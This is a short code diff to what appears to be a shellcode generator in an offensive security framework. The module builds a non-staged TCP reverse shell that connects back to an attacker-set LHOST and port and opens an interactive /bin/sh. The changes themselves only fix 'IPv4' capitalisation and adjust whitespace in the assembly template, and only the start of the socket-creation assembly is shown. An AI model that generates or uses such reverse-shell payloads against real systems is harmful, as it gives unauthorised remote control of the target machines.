@@ -32,10 +32,10 @@ class Shellcode():
 
     tested_platforms = ["Debian 14.2.0-6"]
 
-    summary = "Reverse Shell via TCP over IPV4 that provides an interactive /bin/sh"
+    summary = "Reverse Shell via TCP over IPv4 that provides an interactive /bin/sh"
     summary += " session"
 
-    description = ("TCP-based reverse shell over IPV4 that provides an interactive /bin/sh"
+    description = ("TCP-based reverse shell over IPv4 that provides an interactive /bin/sh"
                    " session. Since this payload is not staged, there is no need for anything"
                    " more than a Netcat listener.")
 
@@ -74,7 +74,9 @@ class Shellcode():
         sin_addr = convert.ip_str_to_inet_addr(argv_dict['LHOST'])
         sin_port = convert.port_str_to_htons(lport)
 
-        source_code = f"""_start:
+        source_code = f"""
+_start:
+
 create_sockfd:
     // int socket(int domain,   // x0
     //            int type,     // x1
